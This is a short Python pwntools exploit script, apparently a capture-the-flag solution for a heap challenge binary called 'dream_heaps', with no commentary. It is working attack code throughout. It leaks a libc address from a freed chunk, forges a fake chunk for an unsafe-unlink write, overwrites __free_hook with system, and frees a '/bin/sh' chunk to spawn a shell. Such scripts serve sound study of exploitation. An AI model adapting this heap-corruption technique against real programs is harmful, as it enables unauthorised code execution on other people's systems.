from pwn import *
def cmd(c):
	p.sendlineafter("> ",str(c))
def add(size,c):
	cmd(1)
	p.sendlineafter("eam?\n",str(size))
	p.sendafter("eam?\n",c)
def free(idx):
	cmd(4)
	p.sendlineafter("te?\n",str(idx))
def edit(idx,c):
	cmd(3)
	p.sendlineafter("ge?\n",str(idx))
	p.send(c)
def show(idx):
	cmd(2)
	p.sendlineafter("ad?\n",str(idx))
p=process('./dream_heaps')
add(0x88,"A")#0
add(0x88,"B")#1
free(0)
add(0x88,"A")#2
show(2)
base=u64(p.read(6).ljust(8,'\x00'))-(0x7ffff7dd1b41-0x00007ffff7a0d000)
log.warning(hex(base))
libc=ELF("./dream_heaps").libc
libc.address=base
add(0xf8,"A")#3
add(0x88,"/bin/sh")#4
edit(1,p64(0)+p64(0x81)+p64(0x6020a8-0x18)+p64(0x6020a8-0x10)+p64(0)*12+p64(0x80))
free(3)
edit(1,p64(0)*2+p64(libc.symbols['__free_hook']))
edit(0,p64(libc.symbols['system']))
gdb.attach(p)
p.interactive()
